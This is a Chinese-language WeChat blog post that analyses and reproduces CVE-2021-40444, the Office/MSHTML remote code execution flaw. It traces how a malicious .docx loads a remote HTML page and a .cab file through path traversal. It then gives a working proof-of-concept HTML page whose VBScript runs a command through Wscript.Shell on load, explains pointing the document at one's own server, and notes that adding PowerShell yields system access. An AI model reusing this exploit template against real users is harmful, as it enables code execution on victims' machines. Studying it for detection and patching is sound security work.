#  0Day - CVE-2021-40444 分析与利用

原创 校长  [ 不懂安全的校长 ](javascript:void\(0\);)

**不懂安全的校长** ![]()

微信号 sectip

功能介绍 校长不懂安全，总是发些奇奇怪怪的笔记！

____

__

收录于话题

## 0x01 前言

最近这个CVE-2021-40444挺多人想复现的，于是今天就抽空的来看了一下。

 **样本:**

`https://bazaar.abuse.ch/sample/938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52/`

`https://bazaar.abuse.ch/sample/d0fd7acc38b3105facd6995344242f28e45f5384c0fdf2ec93ea24bfbc1dc9e6`

`https://bazaar.abuse.ch/sample/1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00`

![](https://gitee.com/fuli009/images/raw/master/public/20210910222738.png)![](https://gitee.com/fuli009/images/raw/master/public/20210910222744.png)![](https://gitee.com/fuli009/images/raw/master/public/20210910222745.png)![](https://gitee.com/fuli009/images/raw/master/public/20210910222746.png)

## 0x02 分析

在测试环境中打开文档

![](https://gitee.com/fuli009/images/raw/master/public/20210910222747.png)是的，它在远程加载！

我们先开启开发工具

![](https://gitee.com/fuli009/images/raw/master/public/20210910222748.png)

然后解压我们下载的`.docx`,使用`7-Zip`来提取文件

![]()`\word\_rels\document.xml.rels`找到这个文件然后打开它

![](https://gitee.com/fuli009/images/raw/master/public/20210910222749.png)发现时通过`MSHTML`来进行远程代码执行

查看它的`html`文件，该文件包含混淆的
`JavaScript`![](https://gitee.com/fuli009/images/raw/master/public/20210910222751.png)

提取一下下载的`.cab`文件，发现里面从提取出名字为`Championship.inf`的文件，并使用目录遍历攻击来运行该文件

![](https://gitee.com/fuli009/images/raw/master/public/20210910222752.png)![](https://gitee.com/fuli009/images/raw/master/public/20210910222753.png)

梳理一下，它是通过打开文档来远程加载文件地址，然后在本地执行`cab文件`并且在内存中加载`Championship.inf`

这么看来其实利用很简单！

## 0x03 复现

我们自己本地配置一下环境
修改`\word\_rels\document.xml.rels`把原先地址修改成我们的![](https://gitee.com/fuli009/images/raw/master/public/20210910222754.png)

参考文档:

`https://www.freebuf.com/articles/network/243747.html`

 **side.html:**

    
    
    <html>  
    <head>  
    <meta http-equiv="Content-Language" content="en-us">  
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">  
    <title>Outlook</title>  
    <script id=clientEventHandlersVBS language=vbscript>  
      
    <!--  
     Sub window_onload()  
         Set cmd = CreateObject("Wscript.Shell")  
         cmd.Run("calc")  
     End Sub  
    -->  
    </script>  
    </head>  
    <body>  
    <h1>CVE-2021-40444</h1>  
     <object classid="clsid:edbc374c-5730-432a-b5b8-de94f0b57217" id="ViewCtl1" data="" width="100%" height="100%"></object>  
    </body>  
    </html>  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210910222756.png)

## 0x04 结尾

稍微的结合一下`Powershell`即可打开获取权限![](https://gitee.com/fuli009/images/raw/master/public/20210910222757.png)

 **  
**

 **题外话(知识星球):** 分享Red Team技巧｜资源｜工具 等等 我的学习笔记也会发在这里，顺便督促自己不断学习 &&
偶尔比较佛，或者有事会断更。但是校长一定会一直更新下去的！包括但不限于红队内容。![](https://gitee.com/fuli009/images/raw/master/public/20210910222758.png)

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

0Day - CVE-2021-40444 分析与利用

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

